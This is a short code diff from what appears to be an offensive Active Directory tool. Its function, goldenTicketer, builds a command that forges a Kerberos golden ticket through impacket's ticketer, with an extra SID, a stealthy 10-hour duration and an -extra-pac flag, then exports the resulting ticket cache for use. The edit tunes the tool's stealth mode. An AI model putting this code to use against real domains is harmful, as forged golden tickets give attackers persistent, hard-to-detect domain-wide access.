@@ -235,9 +235,8 @@ def goldenTicketer(user: User):
           f"{getExtraSid(user)}" \
           f"{args.custom}"
     if args.stealth:
-        logger.warning("WARNING: default ticketer duration use days and not hours, you should fix your tools ! "
-                       "(stealth require 10 hours tickets)")
-        cmd += f"-duration 10 "
+        logger.warning("WARNING: Be sure to use the latest version of impacket!")
+        cmd += f"-duration 10 -extra-pac"
     cmd += "'"+user.username+"'"
     cmd += f" && export KRB5CCNAME=$(pwd)/'{user.username}.ccache'"
     print(cmd)
